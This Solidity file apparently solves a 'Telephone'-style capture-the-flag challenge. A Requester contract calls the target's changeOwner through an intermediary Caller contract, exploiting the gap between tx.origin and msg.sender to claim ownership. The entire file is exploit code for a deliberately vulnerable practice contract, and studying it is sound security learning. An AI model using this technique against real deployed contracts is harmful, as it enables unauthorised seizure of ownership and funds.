// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Caller {
    
    function getRights(address _telephone, address _owner) external {
        ITelephone telephone = ITelephone(_telephone);
        telephone.changeOwner(_owner);
    }
}

contract Requester {
    address public owner;


    constructor() public {
        owner = msg.sender;
    }

    function requestCall(address _caller, address _instance) public {
        Caller caller = Caller(_caller);
        caller.getRights(_instance, owner);
    }
}